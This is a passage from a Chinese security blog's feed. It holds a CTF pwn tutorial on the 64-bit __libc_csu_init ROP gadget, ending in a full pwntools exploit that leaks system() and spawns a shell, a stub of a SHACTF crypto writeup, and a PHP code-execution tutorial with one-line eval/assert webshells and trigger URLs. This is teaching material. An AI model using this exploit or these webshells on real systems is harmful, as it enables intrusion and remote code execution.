<li>成功的调用write()函数</li>
</ul>
<p>现在利用脚本具体如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'level5'</span>)</div><div class="line">p = process(<span class="string">'./level5'</span>)</div><div class="line">log.info(proc.pidof(p)[<span class="number">0</span>])</div><div class="line">got_write = elf.got[<span class="string">'write'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"got_write: "</span> + hex(got_write)</div><div class="line">got_read = elf.got[<span class="string">'read'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">"got_read: "</span> + hex(got_read)</div><div class="line">main = <span class="number">0x400564</span></div><div class="line">payload1 =  <span class="string">"\x00"</span>*<span class="number">136</span></div><div class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></div><div class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></div><div class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span></div><div class="line">payload1 += p64(main)</div><div class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></div><div class="line">raw_input()</div><div class="line">p.send(payload1)</div><div class="line">raw_input()</div></pre></td></tr></table></figure></p>
<p>其中log.info(proc.pidof(p)[0])用来输出process的pid，用于gdb的attach。第一个raw_input()是在发送payload之前attach上去，这样能具体的观察到发送前后内存的bain话，最后一行raw_input()是在发送payload后挂住脚本防止level5直接退出。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/1.png?raw=true" alt=""></p>
<p>如图所示，进程的PID号为4597.用gdb命令<code>gdb attach 4597</code>后即可附加到进程上。在py脚本中按一下回车，这时会执行p.send(payload1)。接下来正式开始调试，以下命令均在gdb中进行。</p>
<h2 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>接下来我们开始正式的第一阶段的ROP<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload1 =  &quot;\x00&quot;*136</div><div class="line">payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</div><div class="line">payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</div></pre></td></tr></table></figure></p>
<p>此时程序执行到read(STDIN_FILENO, buf, 512)，我们按<code>n</code>后，程序执行完read，将我们的payload读到了栈上。我们输入了136个<code>0</code>，然后是通用gadget的起始位置<code>0x400606</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/2.png?raw=true" alt=""></p>
<p>接下去继续输入<code>n</code>，当程序执行将到<code>0x400563 &lt;vulnerable_function+31&gt;:    ret</code>时，可以观察到此时栈顶为<code>0x400606</code>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/3.png?raw=true" alt=""></p>
<p>继续输入<code>n</code>，程序跳到通用gadget里，开始正式的rop。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/4.png?raw=true" alt=""></p>
<p>根据我们的payload：p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0)，结合上图的stack分析，可知此时的栈中数据分布如下（小端序）：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">起点</th>
<th style="text-align:center">+0</th>
<th style="text-align:center">+1</th>
<th style="text-align:center">+2</th>
<th style="text-align:center">+3</th>
<th style="text-align:center">+4</th>
<th style="text-align:center">+5</th>
<th style="text-align:center">+6</th>
<th style="text-align:center">+7</th>
<th style="text-align:center">对应数据</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">rsp</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x0</td>
</tr>
<tr>
<td style="text-align:center">rsp+8</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x0</td>
</tr>
<tr>
<td style="text-align:center">rsp+16</td>
<td style="text-align:center">01</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x1</td>
</tr>
<tr>
<td style="text-align:center">rsp+24</td>
<td style="text-align:center">00</td>
<td style="text-align:center">10</td>
<td style="text-align:center">60</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x601000</td>
</tr>
<tr>
<td style="text-align:center">rsp+32</td>
<td style="text-align:center">01</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x1</td>
</tr>
<tr>
<td style="text-align:center">rsp+40</td>
<td style="text-align:center">00</td>
<td style="text-align:center">10</td>
<td style="text-align:center">60</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x601000</td>
</tr>
<tr>
<td style="text-align:center">rsp+48</td>
<td style="text-align:center">08</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x8</td>
</tr>
<tr>
<td style="text-align:center">rsp+56</td>
<td style="text-align:center">f0</td>
<td style="text-align:center">05</td>
<td style="text-align:center">40</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">00</td>
<td style="text-align:center">0x4005f0</td>
</tr>
</tbody>
</table>
</div>
<p>此时各寄存器的值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/5.png?raw=true" alt=""></p>
<p>我们继续按<code>n</code>，程序执行完<code>mov    rbx,QWORD PTR [rsp+0x8]</code>，将<code>rsp+0x8</code>也即<code>rsp+8</code>地址处的数据以QWORD形式即8字节赋值给rbx，执行完后，rbx将为0。所以这里有一点要注意的，我们的payload开头是这样的：p64(0) +p64(0) + p64(1) + ……，第一个p64(0)，是起一个padding的作用，用来填充rsp到rsp+0x7之间的数据的。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/6.png?raw=true" alt=""><br>（因为之前调用的read和write的第一个参数就是STDIN_FILENO，值为0，所以这里rbx原本就是0，所以可能感觉没啥变化，其实就是用0赋值给了一个原本就是0的rbx）</p>
<p>接下去按<code>n</code>，执行<code>mov    rbp,QWORD PTR [rsp+0x10]</code>，将<code>rsp+0x10</code>也即<code>rsp+16</code>地址处的数据以QWORD形式即8字节赋值给rbp。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/7.png?raw=true" alt=""></p>
<p>接下去一直按<code>n</code>，程序依次执行mov操作，直至<code>add    rsp,0x38</code>，此时寄存器情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/8.png?raw=true" alt=""></p>
<p>几个重要的寄存器值列举如下：</p>
<ul>
<li>RBX: 0x0</li>
<li>RBP: 0x1</li>
<li>R12: 0x601000</li>
<li>R13: 0x1</li>
<li>R14: 0x601000</li>
<li>R15: 0x8</li>
</ul>
<p>此时栈中数据仍然如前：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/9.png?raw=true" alt=""></p>
<p>接下去我们输入<code>n</code>，程序执行完<code>add    rsp,0x38</code>，即将栈顶加上0x38，也即加上56，这相当于是降低了栈顶（栈从低地址向高地址增长）。接下去程序将会执行<code>ret</code>指令，而此时的栈，注意是此时的栈，其内容如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/10.png?raw=true" alt=""></p>
<p>接下去输入<code>n</code>，将会执行<code>ret</code>指令，相当于<code>pop rip</code>，也就是说执行完<code>ret</code>，将会跳转到栈顶所指的地址<code>0x4005f0</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/11.png?raw=true" alt=""></p>
<h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>接下来算是进入ROP的第二阶段。</p>
<p>这时的各寄存器的值如下图，</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/12.png?raw=true" alt=""></p>
<p>在经过三个<code>mov</code>操作后<code>mov    rdx,r15</code>，<code>mov    rsi,r14</code>，<code>mov    edi,r13d</code>，我们成功地把进行write函数调用所需的三个参数都布置好了。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/14.png?raw=true" alt=""></p>
<p>寄存器数据如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/13.png?raw=true" alt=""></p>
<p>接下去会执行<code>call   QWORD PTR [r12+rbx*8]</code>，而我们已经将rbx置为0，r12置为write的got地址，所以执行这句语句，其实就是在调用write()函数。用如下命令可以查看<code>r12+rbx*8</code>处具体的值。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ x/gx <span class="variable">$r12</span>+<span class="variable">$rbx</span>*8</div><div class="line">0x601000 &lt;write@got.plt&gt;:	0x00007fdb0df2c280</div></pre></td></tr></table></figure></p>
<h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>在call指令执行完了后，即调用完write（）函数后，我们进入ROP的第三阶段，收尾阶段。毕竟调用完后不能让程序崩溃啊。这时候对应的payload是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload1 += &quot;\x00&quot;*56</div><div class="line">payload1 += p64(main)</div></pre></td></tr></table></figure></p>
<p>此时寄存器中：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/15.png?raw=true" alt=""></p>
<p>这是之前第一阶段中，我们设置的，RBX = 0x0，RBP = 0x1。将会进行如下三条指令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x4005fd &lt;__libc_csu_init+93&gt;:	add    rbx,0x1</div><div class="line">0x400601 &lt;__libc_csu_init+97&gt;:	cmp    rbx,rbp</div><div class="line">0x400604 &lt;__libc_csu_init+100&gt;:	jne    0x4005f0 &lt;__libc_csu_init+80&gt;</div></pre></td></tr></table></figure></p>
<p>将<code>rbp</code>加1，得到0x01，然后与值为0x01的rbp进行比较，<code>jne</code>指令说明如果两者比较相等则不会进行跳转，所以这里不会执行跳转，而是继续执行。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/16.png?raw=true" alt=""></p>
<p>接下来“回”到了第一阶段的代码，此时的栈中的情况如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/17.png?raw=true" alt=""></p>
<p>我们会执行六次的<code>mov</code>操作，但我们此时不需要再布置参数，所以可以说不用管：)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0x400606 &lt;__libc_csu_init+102&gt;:	mov    rbx,QWORD PTR [rsp+0x8]</div><div class="line">0x40060b &lt;__libc_csu_init+107&gt;:	mov    rbp,QWORD PTR [rsp+0x10]</div><div class="line">0x400610 &lt;__libc_csu_init+112&gt;:	mov    r12,QWORD PTR [rsp+0x18]</div><div class="line">0x400615 &lt;__libc_csu_init+117&gt;:	mov    r13,QWORD PTR [rsp+0x20]</div><div class="line">0x40061a &lt;__libc_csu_init+122&gt;:	mov    r14,QWORD PTR [rsp+0x28]</div><div class="line">0x40061f &lt;__libc_csu_init+127&gt;:	mov    r15,QWORD PTR [rsp+0x30]</div><div class="line">0x400624 &lt;__libc_csu_init+132&gt;:	add    rsp,0x38</div></pre></td></tr></table></figure></p>
<p>接下来，会将rsp加上0x38，即加上56。结合栈的情况，这次add操作，将会将main函数的地址作为栈顶。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/18.png?raw=true" alt=""></p>
<p>所以这一阶段的payload的构成是56个<code>\x00</code>，紧接是准备回到某个位置的内存地址。在执行完ret后，程序将回到mian函数中，以便我们进行下一次的利用。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>综合对三个阶段的分析，在64位程序栈溢出时若用了__libc_csu_init中的gadget，其payload组成如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">payload = &apos;\x00&apos; * offset # offset是溢出偏移点</div><div class="line">## 第一阶段</div><div class="line">payload += p64(mov_rbx_rsp0x8_addr)</div><div class="line">payload += p64(0)  # 填充rsp到rsp+7间的数据</div><div class="line">payload += p64(0)  # 为后面 rbx 置 0 做准备</div><div class="line">payload += p64(1)  # 为后面 rbp 置 1 做准备</div><div class="line">paylaod += p64(call_func_got_addr) # 要调用函数的GOT地址，因为后面的调用是用QWORD PTR来进行的。</div><div class="line">payload += p64(第一个参数) # 调用函数的第一个参数</div><div class="line">payload += p64(第二个参数) # 调用函数的第二个参数</div><div class="line">payload += p64(第三个参数) # 调用函数的第三个参数</div><div class="line">payload += p64(mov_rdx_r15_addr) # 利用 ret 指令进入rop的第二阶段</div><div class="line">## 第二阶段  该阶段无需控制</div><div class="line"></div><div class="line">## 第三阶段</div><div class="line">payload += &quot;\x00&quot; * 56 # 填充 rsp 到 rsp+55间的数据</div><div class="line">payload += p64(return_addr) # 将要返回的地址，</div></pre></td></tr></table></figure></p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>现在我们利用这个通用ROP，写一个exp。大体思路是，利用DynELF借write()函数泄露出system的地址。但要注意几点，得到system的地址后，不能直接作为call_func_got_addr，而应该先写到bss段，再填入bss段的地址。所以下面的payload中，bss_addr到bss_addr+7，保存着system的地址，bss_addr+8到bss_addr+15保存着字符串“/bin/sh\x00”。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'level5'</span>)</div><div class="line">p = process(<span class="string">'./level5'</span>)</div><div class="line">sh = <span class="string">"/bin/sh\x00"</span></div><div class="line">bss_addr = elf.bss(<span class="number">0x20</span>)</div><div class="line">got_write = elf.got[<span class="string">'write'</span>]</div><div class="line">got_read = elf.got[<span class="string">'read'</span>]</div><div class="line">log.success(<span class="string">"The write got address is "</span>+ hex(got_write))</div><div class="line">log.success(<span class="string">"The read got address is "</span>+ hex(got_read))</div><div class="line"></div><div class="line">main = <span class="number">0x400564</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	p.recv()</div><div class="line">	payload =  <span class="string">"\x00"</span>*<span class="number">136</span></div><div class="line">	payload += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(address) + p64(<span class="number">8</span>)</div><div class="line">	payload += p64(<span class="number">0x4005F0</span>)</div><div class="line"></div><div class="line">	payload += <span class="string">"\x00"</span>*<span class="number">56</span></div><div class="line">	payload += p64(main)</div><div class="line">	p.send(payload)</div><div class="line">	data = p.recv(<span class="number">8</span>)</div><div class="line">	<span class="keyword">return</span> data</div><div class="line"></div><div class="line">dynelf = DynELF(leak,elf=elf)</div><div class="line">system_addr = dynelf.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">log.success(<span class="string">"The system address is "</span> + hex(system_addr))</div><div class="line"></div><div class="line"></div><div class="line">payload2 = <span class="string">'\x00'</span> * <span class="number">136</span></div><div class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>)</div><div class="line">payload2 += p64(<span class="number">0x4005F0</span>)</div><div class="line">payload2 += <span class="string">"\x00"</span> * <span class="number">56</span></div><div class="line">payload2 += p64(main)</div><div class="line">p.send(payload2)</div><div class="line"></div><div class="line">system_sh = p64(system_addr) + sh</div><div class="line">p.send(system_sh)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</div><div class="line"></div><div class="line">payload3 = <span class="string">'\x00'</span> * <span class="number">136</span></div><div class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</div><div class="line">payload3 += p64(<span class="number">0x4005F0</span>)</div><div class="line">payload3 += <span class="string">"\x00"</span>*<span class="number">56</span></div><div class="line">payload3 += p64(main)</div><div class="line">p.send(payload3)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170809/19.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;web狗的二进制之路。&lt;br&gt;
    
    </summary>
    
      <category term="Bin Security" scheme="http://yoursite.com/categories/Bin-Security/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="rop" scheme="http://yoursite.com/tags/rop/"/>
    
  </entry>
  
  <entry>
    <title>SHACTF-2017-Secure Login-writeup </title>
    <link href="http://yoursite.com/2017/08/09/SHACTF-2017-Secure-Login-writeup/"/>
    <id>http://yoursite.com/2017/08/09/SHACTF-2017-Secure-Login-writeup/</id>
    <published>2017-08-09T05:13:46.000Z</published>
    <updated>2017-08-09T05:15:03.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Secure Login (200) - 67 solves</div><div class="line">This server uses signed tickets to allow users to login, can you find the flag?</div><div class="line">nc secure-login.stillhackinganyway.nl 12345</div><div class="line">chall.py</div><div class="line">e2050ad74ffc19ca7a95435b283b9308</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Task&quot;&gt;&lt;a href=&quot;#Task&quot; class=&quot;headerlink&quot; title=&quot;Task&quot;&gt;&lt;/a&gt;Task&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
    
    </summary>
    
      <category term="writeup:Crypto" scheme="http://yoursite.com/categories/writeup-Crypto/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="crypto" scheme="http://yoursite.com/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>php代码/命令执行漏洞</title>
    <link href="http://yoursite.com/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2017/08/08/php代码-命令执行漏洞/</id>
    <published>2017-08-08T08:38:51.000Z</published>
    <updated>2017-08-08T08:39:29.894Z</updated>
    
    <content type="html"><![CDATA[<p>php代码/命令执行漏洞<br><a id="more"></a></p>
<h1 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h1><h2 id="php代码执行相关"><a href="#php代码执行相关" class="headerlink" title="php代码执行相关"></a>php代码执行相关</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed eval ( string $code )</div></pre></td></tr></table></figure>
<p>把字符串<code>code</code>作为php代码执行。常见的一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">eval</span>($_GET[<span class="string">'pass'</span>])</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo();</div></pre></td></tr></table></figure></p>
<p>得到phpinfo()页面。</p>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>PHP 5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, string $description ] )</div></pre></td></tr></table></figure></p>
<p>PHP 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</div></pre></td></tr></table></figure></p>
<p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的响应。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</p>
<p>一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	assert($_GET[<span class="string">'pass'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx/codeexec.php?pass=phpinfo()</div></pre></td></tr></table></figure></p>
<p>phpinfo()后可以不用分号。得到phpinfo()页面。</p>
<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</div></pre></td></tr></table></figure>
<p>搜索subject中匹配pattern的部分， 以replacement进行替换。当使用被弃用的 e 修饰符时, 这个函数会转义一些字符，在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串<br>更详细的说明见：<a href="http://php.net/preg_replace" target="_blank" rel="external">php-preg_replace</a></p>
<h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</div></pre></td></tr></table></figure>
<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 传入call_user_func()的参数不能为引用传递。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x=phpinfo()</div></pre></td></tr></table></figure></p>
<h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed call_user_func_array ( callable $callback , array $param_arr )</div></pre></td></tr></table></figure>
<p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	call_user_func_array($_GET[<span class="string">'chybeta'</span>],$_GET[<span class="string">'ph0en1x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?chybeta=assert&amp;ph0en1x[]=phpinfo()</div></pre></td></tr></table></figure></p>
<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string create_function ( string $args , string $code )</div></pre></td></tr></table></figure>
<p>该函数的内部实现用到了<code>eval</code>，所以也具有相同的安全问题。第一个参数<code>args</code>是后面定义函数的参数，第二个参数是函数的代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$a = $_GET[<span class="string">'chybeta'</span>];</div><div class="line">	$b = create_function(<span class="string">'$a'</span>,<span class="string">"echo $a"</span>);</div><div class="line">	$b(<span class="string">''</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo();</div></pre></td></tr></table></figure></p>
<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">array array_map ( callable $callback , array $array1 [, array $... ] )</div></pre></td></tr></table></figure>
<p>作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
